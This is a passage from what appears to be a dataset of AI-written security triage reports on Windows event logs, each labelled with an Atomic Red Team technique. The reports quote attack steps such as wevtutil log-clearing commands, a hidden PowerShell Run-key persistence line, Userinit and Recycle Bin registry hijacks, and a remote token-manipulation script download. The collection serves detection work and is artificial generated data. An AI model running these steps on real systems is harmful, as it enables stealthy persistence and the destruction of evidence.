   - Powershell execution with a command attributed to `AtomicRedTeam`, a well-known red team tool for adversary simulations, is evident. This command (`NtQueueApcThreadEx.exe -debug`) suggests memory manipulation or privilege escalation attempts.

4. **High Integrity Level Processes**:
   - The presence of processes running with high integrity levels (`wevtutil.exe` and others) indicates an attempt or success in obtaining elevated privileges, potentially enabling further malicious actions.

5. **Privileged Logons**:
   - Event IDs 4624 and 4672 indicate SYSTEM logons with high privileges. Normally, SYSTEM-level logons are expected in routine operations, but given the surrounding context of event log tampering and potential privilege escalation, these are suspect.

### Assessment:

- **Event Log Tampering**: Clear evidence of attempts to conceal actions by clearing logs, with security, system, and PowerShell logs specifically targeted.
- **Use of Red Team Tools**: Indication of usage of the tool `AtomicRedTeam`, suggesting either testing scenarios or malicious intent.

### Conclusion:
Based on the analysis, the observed activities are consistent with malicious behavior due to the clearing of logs coupled with the potential use of known offensive tools and execution of suspicious scripts.

### Guidance on How to Proceed:

Winlogon Userinit Key Persistence - PowerShell,"Based on the analysis of the provided logs, here are the findings:

### Suspicious and Anomalous Behavior:

1. **PowerShell Activity**:
    - The logs indicate a PowerShell command was executed to modify the Windows registry key `HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon` by setting `Userinit` to `Userinit.exe, C:\Windows\System32\cmd.exe`. This alteration of the `Userinit` registry key is highly suspicious as it is a common persistence mechanism used by malware to execute commands or scripts upon user logon.
    - The modification was performed using the `Set-ItemProperty` cmdlet with the `-Force` flag, implying an attempt to forcefully set the value regardless of potential errors or restrictions.

2. **Event Log Clearing**:
    - The logs show multiple entries of event log clearing activities shortly after the suspicious PowerShell script execution. Specifically, entries from the Windows System, Security, and PowerShell logs were cleared by a user (`admin_test`), which could indicate an attempt to cover tracks following potentially malicious activity.

3. **Process Execution and Parent-Child Relationships**:
    - The `wevtutil.exe` process, which is responsible for managing Windows Event Logs, was invoked several times, suggesting ties to the event log clearing activities.
    - The combination of invoking system tools like `whoami.exe`, `wevtutil.exe`, and registry modification through PowerShell under a high integrity level can be indicative of a privileged escalation attempt or unauthorized system manipulation.

### Possible Indicators of Malicious Activity:

- The PowerShell command used to modify the registry key, along with the clearing of event logs shortly afterward, strongly suggests malicious intent. The registry modification and script execution are typical steps taken by adversaries attempting unauthorized access or establishing persistence on a compromised system.

- The repeated execution of system management tools and clearing of logs aligns with tactics used to evade detection, indicating that the system may be compromised or at risk.

### Assessment and Recommendation:

- **Assessment**: The behavior observed in the logs—specifically the PowerShell script modifying the registry for persistence and the subsequent clearing of event logs—strongly indicates malicious activity.

- **Threats/Risks Identified**: Potential unauthorized access, system compromise, persistence mechanism, and evasion tactics executed on the CEO's machine pose significant risks to the organization's security.

- **Guidance**: Immediate action is recommended to isolate the affected machine (Server002) to prevent further spread or damage. Conduct a thorough forensic investigation to ascertain the extent of the compromise. Ensure that the compromised user account (`admin_test`) is reviewed for unauthorized activities, and make changes to relevant passwords as a precaution. Evaluate security policies and incident response plans to improve the detection and prevention of similar incidents in the future.

### Conclusion:

Based on the observed activities and analysis, the resolution is:

- **MALICIOUS** - the logs contain activities that strongly indicate a malicious compromise, specifically registry manipulation for persistence and log clearing to cover tracks.
"
Service Installation PowerShell,"Upon analyzing the provided event logs, a few key behaviors and activities have been identified that suggest potential malicious activity:

1. **Use of PowerShell for Service Creation:**
   - The logs show that a PowerShell command was executed to create a service named ""AtomicTestService_PowerShell"" with the executable located at ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1543.003\\bin\\AtomicService.exe"". This kind of behavior is aligned with persistence techniques often used by threat actors. The naming and path suggest a possible test or simulation of an attack using the ""Atomic Red Team"" framework, which is known for simulating adversary techniques.

2. **Service Execution and Log Clearing:**
   - Following the creation of the service, there is a log entry confirming that the service was successfully started.
   - Additionally, the system logs indicate that the event logs for System, Windows PowerShell, and Security were cleared. Log clearing is a technique commonly used by attackers to cover tracks post-compromise.

3. **Use of `wevtutil.exe` Command:**
   - The Sysmon logs show multiple executions of `wevtutil.exe` to clear event logs (System, Security, and Windows PowerShell). The command execution by the user `SERVER002\\admin_test` further confirms this action.
   - Typically, `wevtutil.exe` usage in this manner (especially after suspicious activity) could indicate an attempt to hide actions performed on the system, which can be considered malicious.

4. **Service Creation with LocalSystem Account:**
   - The service creation logs indicate that the newly created service runs under the ""LocalSystem"" account, which provides high privileges to the service, a potential security risk if abused by unauthorized entities.

5. **Sysmon and Other Logs:**
   - There are several Sysmon logs correlated with high-integrity processes, including conhost.exe and whoami.exe, which might be legitimate but in conjunction with the other activities suggest a pattern of monitoring or manual exploration by an unauthorized user.

Based on these observations, there are clear indications of compromise where there was an attempt to simulate or execute an Atomic Red Team test scenario, which while potentially benign in an isolated testing environment, signals potential malicious activity if unexpected. The clearing of event logs post-event execution further compounds the evidence of suspicious activity.

**Final Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the machine from the network to prevent any further potential harm.
- Conduct a thorough forensic investigation to confirm and understand the extent of the compromise.
- Review and monitor other systems for similar activities as lateral movement could have occurred.
- Inform executive teams and possibly legal/the appropriate authorities for further action, especially if company policy or privacy laws were violated.
- Enhance logging and monitoring to detect and alert similar activities in the future."
Remote Process Injection with Go using CreateRemoteThread WinAPI,"In analyzing the Windows event logs provided, there are several events that indicate suspicious activity on the host, particularly focusing on Server002. Here’s a breakdown of the findings:

### Suspicious Activities:
1. **Event Log Clearing:**
   - From the `System` and `Security` logs, event IDs 104 and 1102 show that event logs have been cleared by a user named `admin_test`. The deliberate clearing of logs can often indicate an attempt to hide malicious activity.

2. **PowerShell Execution with Malicious Intent:**
   - In the `Windows PowerShell log`, PowerShell command execution is noted with potential malicious command lines involving `CreateRemoteThread.exe`. This is a known technique used in process injection, specifically reflected by the Atomic Red Team technique T1055 for testing security controls.

3. **Privilege Escalation and High-Integrity Processes:**
   - The `Security log` indicates the use of multiple high-level privileges, such as `SeDebugPrivilege` among others (event ID 4672). These privileges are commonly associated with attempts to manipulate critical OS settings or to escalate privileges maliciously.

4. **Anomalous Process Activity:**
   - Several `Sysmon log` entries show unusual parent/child process relationships and the execution of system utilities (`wevtutil.exe`) to clear event logs. The presence of processes like `werfault.exe` and `conhost.exe` in association with suspicious actions reinforces the notion of process manipulation.

5. **Time Manipulation:**
   - There are logs (event ID 4616) indicating that the system time has been altered. Time manipulation can be used to manipulate timestamps in logs or to evade time-bound security measures.

### Assessment:
Based on the logs, the sequence of activities strongly suggests that the system has been compromised. The clearing of logs, suspicious PowerShell activity, alteration of system time, and usage of system binaries in a way that aligns with known attack tactics (such as using `CreateRemoteThread`) point towards malicious intent.

### Threats and Risks:
- **Data Exfiltration or Manipulation:** The use of high-level privileges may allow threat actors to access sensitive data or manipulate system settings.
- **Persistence:** The activities might be indicative of efforts to establish persistence on the target machine.
- **Undetected Malicious Processes:** The clearing of logs is a tactic to cover tracks, possibly indicating that other activities may have occurred undetected.

### Guidance:
1. **Immediate Isolation and Investigation:** The impacted host (Server002) should be isolated from the network to prevent any further potential spread of the threat.
2. **Forensic Analysis:** Conduct a detailed forensic analysis, including memory and disk analysis, to identify additional indicators of compromise and understand the full extent of the breach.
3. **Review User Access and Logs:** Investigate user accounts, especially `admin_test`, to verify their activity and credentials integrity.
4. **Remediation Measures:** Based on the investigation results, implement necessary remediation steps such as patching vulnerable software, updating antivirus definitions, and strengthening network segmentation.
5. **System Auditors and Monitoring:** Increase the frequency of security audits and monitoring, especially related to the use of PowerShell and administrative actions on critical systems.

### Resolution:
**MALICIOUS** - The logs indicate activities that align with known indicators of compromise and malicious tactics. Immediate action is advised to mitigate further risk."
Parent PID Spoofing - Spawn from svchost.exe,"Upon reviewing the provided event logs, I identified the following suspicious and potentially malicious activities:

1. **Clearing of Event Logs**: The logs indicate multiple instances of event clearing activities:
   - **System Log (Event ID 104)**: Logs cleared for both the System and Windows PowerShell channels by the user ""admin_test"".
   - **Security Log (Event ID 1102)**: Security logs were cleared by the same user.
   - The use of `wevtutil.exe` command for clearing logs is noted in Sysmon logs with multiple execution events of the command.

   This is a strong indicator of an attempt to cover up malicious activity, as attackers often clear logs to hide their tracks.

2. **Suspicious PowerShell Activity**: 
   - There is an execution of a PowerShell command that uses `Get-CimInstance` and `Start-ATHProcessUnderSpecificParent` to launch another PowerShell process with potential process injection techniques.
   - Such obfuscation and indirect execution may indicate an attempt to evade detection by security tools.

3. **Privilege Usage**:
   - The security log includes Event ID 4672 indicating that a logon session was created with special privileges, which were used to assign several high-level tokens such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`. This suggests potential privilege escalation or persistence mechanisms.

4. **Unusual Process Creation**:
   - Multiple instances of PowerShell and `wevtutil.exe` execution with high integrity levels without a clear description of their necessity may suggest script-based attacks or system manipulation.
   - Execution of `whoami.exe`, `hostname.exe`, and repeated instances of `conhost.exe`, which often accompany terminal-based commands, may imply internal reconnaissance or script-based automation potentially by an attacker.

5. **General Context**:
   - The suspicious behavior is concentrated around a small time window, and combined with the log clearing, it indicates preparation or deployment of some form of malicious payload.

Given the above observations, it is prudent to categorize this activity as **MALICIOUS**. The log clearing, combined with suspicious PowerShell executions, and privilege escalation attempts are characteristic of compromise events. 

**Recommendations**:
- Immediately isolate the affected system, Server002, to prevent any further malicious activities.
- Conduct a thorough forensic investigation to identify any persistence mechanisms (e.g., registry changes, scheduled tasks).
- Review and update security controls to better monitor for similar activities in the future, particularly focusing on PowerShell script logging and the detection of unusual process creation.
- Consider resetting credentials for the user `admin_test` and review potential compromises of user accounts, especially those with administrative privileges.
- Re-evaluate and reinforce policies related to administrative access and sensitive operations like log clearing.

These steps will help in containing the current incident and minimizing the risk of future security breaches."
WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique,"**Detailed Analysis:**

I have carefully reviewed the provided event logs from the Windows host, focusing on potential indicators of compromise, including process executions, command-line arguments, log clearing activities, and unusual privilege escalations.

1. **Log Clearing Activities:**
   - There are multiple instances where logs were cleared (`EventID 1102` in Security Log, `EventID 104` in System Log). The process used for clearing logs was `wevtutil.exe`, executed by the user `SERVER002\\admin_test`.
   - Clearing logs using `wevtutil.exe` is a common tactic used to obfuscate malicious activities by removing evidence from event logs.

2. **Suspicious PowerShell Activity:**
   - An instance of PowerShell (`powershell.exe`) executed a script directly from a remote URL: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1`.
   - This activity suggests the execution of potentially malicious scripts aimed at manipulating tokens, likely for privilege escalation (as indicated by the intent to run `Get-WinLogonTokenSystem`).

3. **Privilege Escalation:**
   - The `4672` security events show that `admin_test` was granted high-level privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.), which are typically unnecessary for regular administrative tasks and could indicate an attempt to escalate privileges or perform sensitive operations unnoticed.

4. **Unusual Time Change Events:**
   - There are occurrences of time being changed on the system (`EventID 4616` in Security Log, `EventID 1` in System Log associated with `svchost.exe`).
   - While this could sometimes be a normal operation, especially if it corresponds to a legitimate system operation or time synchronization, in combination with log clearing, it can suggest a malicious attempt to cover tracks by altering timestamps.

**Assessment:**

The event logs show several indicators of potentially **malicious activities**:
- Log clearing by `wevtutil.exe`, especially without a legitimate administrative task, is suspicious and often used to hide evidence.
- PowerShell executing remote scripts from a seemingly untrusted source is a clear indicator of potentially malicious script execution.
- The privilege escalation techniques and unusual time-change events reinforce the suspicion of an ongoing attack or compromise.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate `Server002` to prevent further potential spread of any malicious activity.
- Conduct a thorough malware scan and review the PowerShell script from the URL to understand its intent and actions.
- Collect and preserve logs and any artifacts for further forensic analysis.
- Reset credentials for `admin_test` and any other potentially impacted accounts.
- Review user permissions and audit recent changes to ensure privileges align with job roles.
- Implement monitoring for unusual command executions, log clearing events, and remote script executions to prevent future occurrences."
Domain Password Policy Check: Common Password Use,"The review of the provided log entries reveals several potentially suspicious activities that warrant further investigation:

### Suspicious and Anomalous Activities Highlighted:

1. **Event Log Clearing:**
   - Multiple instances of event log clearance were observed:
     - `EventID 104` in the System log indicates that the ""System"" and ""Windows PowerShell"" event logs were cleared by the user `admin_test`.
     - `EventID 1102` in the Security log mentions the clearing of the Security logs by the same user.
   - Clearing event logs is a common tactic used by malicious actors to cover their tracks, suggesting that the user `admin_test` might be attempting to hide activities on the machine.

2. **Uncommon Use of `wevtutil.exe`:**
   - The Sysmon logs show consistent use of `wevtutil.exe` (Eventing Command Line Utility) by the user `admin_test` to clear various logs (`Sysmon`, `Application`, `System`, and `Security` logs). This behavior aligns with effort towards log manipulation, typically associated with illicit activity.

3. **PowerShell Command Execution:**
   - A PowerShell script was executed by `admin_test` that checks for and potentially changes an account password to `Spring<Year>!`. This script is executed with high integrity levels, suggesting administrative privileges.
   - The PowerShell command is considerably complex, involving credential handling and interaction with Active Directory account password settings (`Set-ADAccountPassword`), indicating a targeted action rather than routine maintenance.

4. **EDR Alert and SVCHost Activities:**
   - The EDR alert on the CEO's machine might have been triggered due to unusual or suspicious PowerShell activity.
   - The creation of processes related to system utilities, and standard operations (such as `whoami.exe`, `hostname.exe`, and Registry operations) are also noted but could be routine. However, under the circumstances, they assume greater significance as potential reconnaissance or privilege verification.

5. **Process Execution Patterns:**
   - Numerous instances of `conhost.exe` running as child processes to various executables during this timeline, a pattern that can sometimes be indicative of command execution processes being masked.
   
6. **Edge Browser Update:**
   - There is an observed process of a Microsoft Edge update (handled by processes under `EDGEMITMP_061C4.tmp\setup.exe`). While the update actions themselves are not inherently suspicious, they could be used as a decoy or entry point if abnormalities in installation or execution are spotted.

### Threat and Risk Assessment:
- The clearing of logs is definitively suspicious, as it generally serves no legitimate administrative purpose unless accompanied by a specific legitimate process.
- Use of PowerShell to modify credentials warrants concern and indicates potentially malicious intent, especially if not part of sanctioned user activity or company policy.
- These activities collectively indicate an attempt to hide activity, modify credentials stealthily, and possibly maintain persistence or escalate privileges.

### Recommended Actions:
1. **Resolution: SUSPICIOUS**
   - Immediate further investigation is warranted to validate the legitimacy of these activities.
     - Verify whether these actions were authorized by internal policy or part of scheduled maintenance.
     - Conduct a thorough examination of other logs and security solutions deployed for the CEO's machine to ascertain any linked intrusions or abnormal patterns.
     - Ensure that user `admin_test` is indeed the authorized personnel executing these actions, and review user specific audits.
     - Consider disabling the affected user account and changing passwords if unauthorized activity is confirmed.

By categorizing the situation as ""SUSPICIOUS,"" it acknowledges unusual behaviors that require additional scrutiny, but do not conclusively point to a known threat as ""MALICIOUS."""
WMI Invoke-CimMethod Scheduled Task,"### Detailed Analysis

Upon reviewing the provided log entries across various channels (System, Sysmon, Windows PowerShell, Security, and Application), I identified several events of interest that warrant further explanation:

#### Indicators of Suspicious Activity:

1. **Log File Clearing Events (System Log - Event ID 104):**
   - There are multiple log file cleared events, specifically targeting the System, Windows PowerShell, and Sysmon Operational logs. This action was performed by the user `admin_test` on the machine `Server002`. Clearing log files is often an attempt by an attacker to remove traces of their activity, which is highly suspicious.
   
2. **Process Execution (Sysmon Log - Event ID 1 and 5):**
   - Multiple executions of `wevtutil.exe` were observed, such as clearing logs for channels such as ""Application"", ""System"", and ""Security"". This tool is often leveraged in malicious scenarios for log tampering.
   - A PowerShell command was executed that reads an XML file and registers a scheduled task using `Invoke-CimMethod`. This specific use indicates potential execution of a script from a location associated with `AtomicRedTeam`, which is a known red team framework. This implies potential adversary simulation activities or compromise.

3. **Time Manipulation (Security Log - Event ID 4616):**
   - Time manipulations were recorded indicating that the system time was altered. Such actions could be used to evade detection systems which rely on timestamps for correlating events.

4. **High-Privilege Operations (Security Log - Event ID 4672):**
   - User `admin_test` was granted several high-privilege tokens, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. Although this may occur in legitimate administrative tasks, it coincides with other anomalous behavior such as log file deletion.

5. **Unusual PowerShell Activity (Windows PowerShell Log - Event ID 600):**
   - There is evidence of a sophisticated PowerShell command executing from location paths that relate to temporary directories often associated with malicious activity or testing frameworks.

### Assessment:

Based on the evidence outlined from the logs, the series of activities observed are more indicative of potential malicious behavior rather than benign administrative activity due to:

- Systematic clearing of log files across multiple log channels using `wevtutil.exe`.
- Execution of PowerShell scripts related to the red team tool `AtomicRedTeam`.
- Time manipulation, which is atypical for legitimate operations and consistent with stealth operations by attackers.
- The allocation of high privilege levels for the user involved in these activities.

### Resolution:

**MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Isolation:** Isolate the affected host (Server002) from the network to prevent further spread of potentially malicious activity.
2. **Forensic Investigation:** Conduct a full forensic analysis on the affected system to uncover further details about the tools and methods used by the adversary.
3. **User Credential Review:** Investigate the activities and credentials of `admin_test` to rule out compromised user accounts.
4. **Review Security Policies:** Increase logging and monitoring to detect and alert on similar activities across the organization.
5. **Incident Response:** Initiate a broader incident response effort to discover any additional compromised systems or malicious activities within the network.
6. **Consult with Red Teams:** If any authorized simulation activities are ongoing, correlate with known sources to rule out false positives.

This behavior is consistent with advanced threat tactics and needs urgent attention to prevent data loss or further compromise."
Azure AD - adding user to Azure AD role,"### Detailed Analysis

#### 1. **Security Log Entry Analysis:**
- **Event ID 1102 (Security Log Cleared):** 
  - A user with the username `admin_test` cleared the Security log. Clearing of logs is often associated with hiding evidence of malicious activity, which is suspicious behavior.

#### 2. **PowerShell Log Entry Analysis:**
- **PowerShell Activity (Event ID 600):**
  - There are multiple entries indicating that `PowerShell.exe` was executed with a script importing the AzureAD module, converting a password to a secure string, creating a credential, and connecting to AzureAD. The script then adds a 'SuperUser' to the 'Global Reader' role.
  - The use of PowerShell to manipulate Azure AD roles without explicit justification or request aligns with suspicious or potentially malicious administrative activity. Especially noteworthy is the plaintext usage of a password, suggesting weak security practices.

#### 3. **Sysmon Log Entry Analysis:**
- **Process Creation (Event ID 1 & 5):**
  - There are multiple instances of `wevtutil.exe` executed with commands to clear logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`). Regular use of `wevtutil` to clear multiple logs aligns with attempts to cover up actions on the system, indicating suspicious activity.
  - High integrity processes executing with `admin_test` user credentials enhances the severity as it suggests performed actions had elevated privileges.
  - The sequential creation of processes like `conhost.exe` following `wevtutil.exe` indicates potential command shell management or execution context which doesn't directly contribute to malicious actions but can point to session control practices possibly malicious in context.

#### 4. **System Log Entry Analysis:**
- **Event Log Clearing (Event ID 104):**
  - Further corroborates log clearing activity noted in Security and Sysmon logs, substantiating attempts to hide activity.

### Assessment of the Situation

- **Suspicious Behavior Noted:**
  - Clearing of security and multiple system logs by the user `admin_test`.
  - Use of PowerShell for potentially unauthorized access or modification of Azure AD roles.
  - Repeated execution of log-clearing commands using `wevtutil.exe`.

### Threats or Risks Identified

- **Privilege Escalation:** 
  - Unauthorized or covert addition of the 'SuperUser' to a potentially high-level role.
  
- **Evidence Tampering:**
  - Log clearing actions are typical of attempts to hide unauthorized or malicious actions on a system.

- **Insider Threat or Credential Compromise:**
  - Use of `admin_test` credentials in a sequence of suspicious activities suggests possible misuse by an insider or compromised account.

### Guidance & Resolution

- **Resolution: SUSPICIOUS**
  - Given the anomalous behavior of log-clearing activities combined with unusual PowerShell command execution, the activity is deemed suspicious rather than clearly malicious without context to confirm intent. Immediate further investigation is required, such as:
    - Verifying the legitimacy and need for the PowerShell activities performed.
    - Examining the user `admin_test` activities and accounts for potential compromise or misuse.
    - Reviewing any connections to Azure AD modifications to ensure legitimate access rights.
    - Reinforcing log management policies and monitoring for similar anomalous behaviors in other users.

These findings should be reviewed alongside operational and network activity logs to build a comprehensive understanding of the situation."
SystemBC Malware-as-a-Service Registry,"Upon carefully analyzing the provided Windows event logs across different channels (Security, Application, System, Windows PowerShell, and Sysmon), several patterns and behaviors emerge that need to be evaluated for indicators of malicious activity.

### Analysis:

1. **Log Clearing:**
   - Repeated entries in the Security, System, and Sysmon logs show that the log files were cleared using `wevtutil.exe` by the user `SERVER002\admin_test`. The command `wevtutil.exe cl <log_name>` was executed multiple times for different logs:
     - Microsoft-Windows-Sysmon/Operational
     - Application
     - System
     - Security
     - Windows PowerShell
   
   This behavior is typically suspicious as attackers often clear logs to cover their tracks and remove evidence of malicious activities.

2. **Suspicious PowerShell Activity:**
   - The Windows PowerShell logs indicate the execution of PowerShell with the command:
     ```powershell
     ""powershell.exe & {$RunKey = \""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\""\r\nSet-ItemProperty -Path $RunKey -Name \""socks5_powershell\"" -Value \""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""}""
     ```
   - This command modifies the registry to maintain persistence, launching a PowerShell script with policies bypassed and in hidden mode. This technique is often used in malware persistence mechanisms.

3. **Execution of Administrative and System Utility Processes:**
   - Execution of `whoami.exe` and `hostname.exe` along with the accompanying `conhost.exe` indicate some enumeration activity. While usage of these commands can be normal in administrative tasks, they can also be utilized as part of a reconnaissance step in an attack chain.

4. **Microsoft Edge Update Activity:**
   - Logs indicate regular execution of Microsoft Edge Update processes:
     - These processes were executed by `NT AUTHORITY\SYSTEM` user.
     - The Sysmon logs indicate several executions tied to the update DLLs, `_msedgeupdate.dll_`. While these executions are normal for system updates, the context of the rest of the logs should be considered to determine their relevance.
  
### Assessment:

**Suspicious and Malicious Actions Detected:**
- Consistent clearing of event logs (`1102` event ID in the Security log for log cleared and `wevtutil.exe`) is a red flag, typically associated with malicious activity.
- The PowerShell activity specifically setting a registry key for persistence in a manner indicative of a covert, unauthorized script execution, suggests potential malware presence.

### Conclusion:

Given the evidence of log clearing (attempts to cover tracks which are a hallmark of malicious activity) and suspicious PowerShell command execution, there's strong indication of unauthorized and potentially malicious actions on the machine. The PowerShell behavior particularly stands out as an indicator of compromise due to its alignment with typical malware persistence techniques.

**Resolution: MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected machine from the network to prevent further spread or data exfiltration.
   - Capture full disk images and memory dumps for deeper forensic analysis.

2. **Forensic and Remediation Steps:**
   - Conduct a thorough investigation to determine the entry point and objective of the malicious activity.
   - Remove any discovered persistence mechanisms and malicious files.
   - Re-evaluate security configurations, especially PowerShell execution policies and logging configurations.
   - Update all systems and software to minimize vulnerabilities.

3. **Monitoring and Reporting:**
   - Increase monitoring of similar activity across the network to identify any lateral movement or additional compromised systems.
   - Report findings to relevant stakeholders to ensure awareness and discuss further security measures."
Powershell Cmdlet Scheduled Task,"Upon reviewing the provided logs, several points of interest and indicators of potential malicious activity have been observed:

1. **Log Clearance Events**:
   - The Security, System, and Windows PowerShell logs have been cleared, all executed by the user ""admin_test"". Clearing event logs can be a technique used by attackers to cover their tracks and indicate a potential security incident. The commands to clear logs (`wevtutil.exe cl [Log Name]`) were executed from the `C:\Users\admin_test\Documents` directory, suggesting a highly suspicious action taken by a user with administrative privileges.

2. **PowerShell Activity**:
   - Multiple entries in the Windows PowerShell logs show a script executed by `admin_test` that creates a scheduled task to run `calc.exe` at user logon, with elevated privileges (`BUILTIN\Administrators` and `RunLevel Highest`). This behavior is suspicious as it can be used to achieve persistence or privilege escalation, typically associated with malicious intent.

3. **Process Creation via Sysmon**:
   - Sysmon logs indicate multiple process creations related to clearing the event logs using `wevtutil.exe`. These processes were initiated by the same user ""admin_test"", aligning with the event log clearance entries noted above.
   - Execution of `powershell.exe` directing to create a scheduled task as described is consistent with potential malicious intent, as observed in the PowerShell logs.

4. **Network Service Activity**:
   - While the Microsoft Edge update activities appear administrative system tasks executed by the Network Service and SYSTEM user, the context and timeframe aligned with log clearance amplify the need for scrutiny, even if they might not directly denote malicious activities.

5. **Other Potential Non-Malicious Activities**:
   - The installations related to Microsoft Edge updates and some system utilities (`hostname.exe`, `whoami.exe`) seem part of regular system maintenance or checks and are not necessarily indicators of compromise by themselves.

### Assessment:
Given the actions of log clearance immediately before and after suspicious scripts designed to create persistent tasks with elevated privileges, the evidence suggests deliberate malicious intent under the guise of administrative tasks. The indications of persistence and potential privilege escalation mark high-risk activity.

### Resolution:
**MALICIOUS** - The logs contain evidence of potentially compromised administrative access being used to clear event logs and create unauthorized scheduled tasks for persistence, both indicative of a malicious intrusion.

### Guidance:
1. **Immediate Actions**:
   - Isolate the affected host (CEO machine: Server002) from the network to prevent further malicious activity.
   - Revoke administrative access of user ""admin_test"" and audit other administrative credentials.
   - Inspect and review scheduled tasks and running processes and terminate unauthorized persistence mechanisms.
   
2. **Further Investigation**:
   - Conduct a thorough investigation into potential breach vectors or exploits that provided access to ""admin_test"".
   - Cross-reference the timing of these malicious activities with other logs (if available) to identify initial access methods.

3. **Long-term Actions**:
   - Enhance monitoring with alerts for log clearance activities and PowerShell execution policies.
   - Implement principles of least privilege and more robust access controls for administrative users.
   - Conduct an incident response drill post-investigation to streamline detection and response capabilities."
Suspicious bat file run from startup Folder,"Based on the review of the provided logs, here is a detailed analysis:

1. **Process Execution and Command-Line Arguments**:
   - There are multiple instances of `wevtutil.exe` being executed under the context of the user `SERVER002\\admin_test`. This utility is used for managing event logs and its frequent execution could indicate someone is attempting to clear or manipulate logs, especially given the command `wevtutil cl`, which is used to clear event logs.
   - `wevtutil.exe` was used with the command lines to clear the Microsoft-Windows-Sysmon/Operational, Application, System, and Security logs (Events 17950, 17954, 17958, and 17962 respectively).
   - A series of `conhost.exe` processes are spawn, commonly indicating command prompts associated with other commands executed.

2. **Log Clearing detected**: 
   - Events suggest that logs for system, security, and PowerShell were cleared (Event IDs: 3566-3567, and Security log Event ID 1102). This activity is often used to cover tracks, indicating potentially malicious intent.

3. **Windows PowerShell Activity**:
   - Powershell activity with scripts or command-line arguments copying and starting a batch file `batstartup.bat`. This is linked with `T1547.001` which is an ID from the MITRE ATT&CK framework indicating a technique for ""Boot or Logon Autostart Execution"", possibly leading to persistence mechanisms.

4. **Time Manipulation**:
   - The system time was adjusted/moved slightly (Event ID: 4616). Time changes, especially several times in quick succession, can be indicative of attempts to alter timestamp evidence.

5. **Summarized Anomalous Behavior**:
   - The frequent running of `whoami.exe` and `hostname.exe` are often not independently critical but when included alongside log and PowerShell activities raise a suspicious flag.
   - Log clearing, PowerShell use with suspicious commands, and time adjustments combined suggest an attempt to cover up actions or leverage persistence mechanisms.

**Assessment**: The investigated logs show evidence of activities that could be considered cover-up and persistence operations. The usage of legitimate system tools such as `wevtutil.exe`, `PowerShell.exe`, and log clearing in a specific sequence is characteristic of potentially malicious behavior aimed at establishing persistence and obscuring activities from detection. The batch file `batstartup.bat` alongside identified techniques is notably suspicious.

**Resolution**: **MALICIOUS**

**Suggested Actions**:
- Immediate containment of the system affected, `Server002`.
- Perform a full forensic analysis to understand the extent of compromise and determine if any additional system modifications have been made.
- Review and audit user activities of `SERVER002\\admin_test`.
- Consider restoring from a known good backup after confirming integrity if the system is compromised.
- Enhance monitoring and employ additional security measures to detect future log-clearing activities and unauthorized PowerShell actions."
Add persistance via Recycle bin,"### Analysis of the Logs
The provided logs include entries from the Application, Security, System, and Sysmon logs indicating a series of activities performed by the `admin_test` user on `Server002`. A detailed analysis reveals the following:

1. **Event Log Clearing**:
   - **Security Log (EventID: 1102)** and **System Log (EventID: 104)**:
     - The logs show that the event logs (Sysmon, Security, and System) were cleared by the user `admin_test`. Clearing event logs is a suspicious activity, often associated with malicious behavior aimed at covering tracks.

2. **Sysmon Logs**:
   - Multiple entries show the use of `wevtutil.exe` to clear the event logs (`Microsoft-Windows-Sysmon/Operational`, `System`, `Application`, `Security`, `Windows PowerShell`) using the command-line utility.
   - The presence of processes `cmd.exe` with arguments related to registry modification is noted, specifically setting the Recycle Bin CLSID to execute `calc.exe`, which is a known technique for persistence or privilege escalation in malicious scripts.

3. **Suspicious Process Executions**:
   - **Registry Modification**:
     - Using `cmd.exe` and `reg.exe` to modify the registry to execute `calc.exe` is suspicious. This is indicative of a potential unauthorized change aimed at executing commands when certain system actions occur.

4. **Activity by EDR-Related Processes**:
   - Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) are seen frequently, which can be benign or related to legitimate updates.

### Assessment of the Situation
- The clearing of event logs without a valid administrative task is a strong indicator of potentially malicious intentions, likely aimed at hiding malicious activity.
- The use of command-line utilities to modify registry keys to execute arbitrary commands suggests malicious intent.

### Threats or Risks Identified
- **Log Clearing**: Concealment of activities, making it challenging to trace back malicious actions.
- **Registry Modification**: Possible persistence mechanism allowing unauthorized code execution.

### Guidance and Resolution
Given the analysis:
- **Resolution: MALICIOUS**: The combination of log clearing immediately followed by registry modification is a clear sign of malicious activity.
  
#### Recommended Actions:
1. **Immediate Response**: Isolate the affected machine (`Server002`) from the network to prevent further potential spread or data exfiltration.
2. **Investigation and Forensics**: Ensure a full forensic investigation is conducted to uncover the extent of the compromise and identify any unauthorized access.
3. **Remediation**: Restore affected systems from a known good backup before the incident. Review and enhance logging and monitoring processes.
4. **Security Measures**: Implement additional security controls such as restricting the use of command-line utilities and ensuring administrative tasks are logged and monitored closely.

These actions will help address the current issue and prevent similar incidents in the future."
Domain Password Policy Check: No Number in Password,"Upon reviewing the provided event logs, the following observations and analyses have been made:

### Suspicious Activities and Analysis

1. **Cleared Event Logs:** 
   - The logs indicate that `admin_test` user cleared the event logs for the System, Security, and Windows PowerShell channels using `wevtutil.exe`. Specifically, these entries:
     - EventID 1102 in the Security log (`wevtutil.exe` cl Security)
     - EventID 104 in the System log and Windows PowerShell logs (`wevtutil.exe` cl System, cl Application, cl ""Windows PowerShell"")
   - This action is suspicious because clearing logs can be an indicator of an attempt to hide malicious activities on a system.

2. **Suspicious PowerShell Activity:**
   - PowerShell logs indicate an attempt to change a password to `UpperLowerLong-special`. The script checks and manipulates credential files, which could hint at unauthorized manipulation or attempts at persistence.
   - The use of `AtomicRedTeam` in file paths indicates the presence of red team tools or simulation frameworks, which can imply either an internal security drill or an actual attack simulation being misused.

3. **Privilege Escalation Attempts:**
